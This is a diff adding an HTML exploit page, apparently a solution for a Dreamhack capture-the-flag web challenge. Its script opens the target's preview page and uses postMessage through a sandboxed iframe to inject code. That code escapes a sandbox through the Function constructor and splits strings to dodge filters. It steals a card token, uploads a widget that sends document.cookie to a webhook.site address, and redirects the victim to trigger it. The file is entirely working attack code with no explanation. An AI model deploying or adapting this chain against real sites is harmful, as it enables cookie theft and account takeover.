@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+const BASE = "http://host3.dreamhack.games:12869";
+const EXFIL = "https://webhook.site/bfe89258-ffa4-4eb3-a6d6-51fdc33af3f1/flag";
+
+function sendCode(previewWin, code) {
+    const iframe = document.createElement('iframe');
+    iframe.sandbox = 'allow-scripts';
+    iframe.srcdoc = `<script>window.opener.postMessage(${JSON.stringify(code)}, '*');<\/script>`;
+    document.body.appendChild(iframe);
+}
+
+const preview = window.open(`${BASE}/preview`);
+preview.onload = () => {
+    const exploit = `
+        (function() {
+            var g = (console.log.__proto__['cons'+'tructor']('return this'))();
+            var token = g['CARD_TOKEN'];
+            var widgetCode = "new Image().src='" + "${EXFIL}?c=' + encodeURIComponent(document.cookie)";
+            var fetchFunc = g['fe'+'tch'];
+            fetchFunc("${BASE}/export", {
+                method: 'POST',
+                credentials: 'include',
+                headers: { 'Content-Type': 'application/javascript', 'X-Card-Token': token },
+                body: widgetCode
+            }).then(function(res) {
+                return res.text();
+            }).then(function(name) {
+                g['loc'+'ation'].href = "${BASE}/review?widget=" + name;
+            });
+        })();
+    `;
+    sendCode(preview, exploit);
+};
+</script>
+</body>
+</html>
